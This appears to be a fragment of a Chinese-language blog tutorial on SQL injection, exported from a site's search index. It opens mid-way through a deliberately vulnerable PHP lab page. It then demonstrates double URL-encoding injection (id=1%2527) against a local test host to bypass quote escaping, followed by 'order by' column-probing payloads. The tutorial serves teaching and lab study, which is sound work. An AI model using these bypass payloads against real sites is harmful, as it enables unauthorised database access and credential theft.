class="string">&#x27;username&#x27;</span>].<span class="string">&quot;\&quot;&quot;</span>.$DuQu[<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mysqli_close($conn);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>输入<code>?id=1</code><br>结果<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020082011371211.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="二次编码进行注入"><a href="#二次编码进行注入" class="headerlink" title="二次编码进行注入"></a>二次编码进行注入</h3><h3 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h3><p>输入URL：<code>?id=1&#39;</code><br>结果被转意了<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200821120754221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们在进行宽字节注入<br>还是不行<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200821120849771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们就可以用二次编码注入进行注入了<br>URL地址<code>http://192.168.0.105/a.php?id=1%2527</code><br>发现叫<code>\</code>给去掉了<br>是存在sql注入漏洞的<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200821120948537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="进行数据读取"><a href="#进行数据读取" class="headerlink" title="进行数据读取"></a>进行数据读取</h3><ol>
<li>判断有几列<br>URL地址<code>http://192.168.0.105/a.php?id=1%2527 order by 3 --+</code><br>显示正常<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020082112130473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>URL地址<code>http://192.168.0.105/a.php?id=1%2527 order by 4 --+</code><br>报错<br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200821121424962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>等等等等等等等等等等等等等等就不演示了</li>
</ol>
]]></content>
      <categories>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
</search>
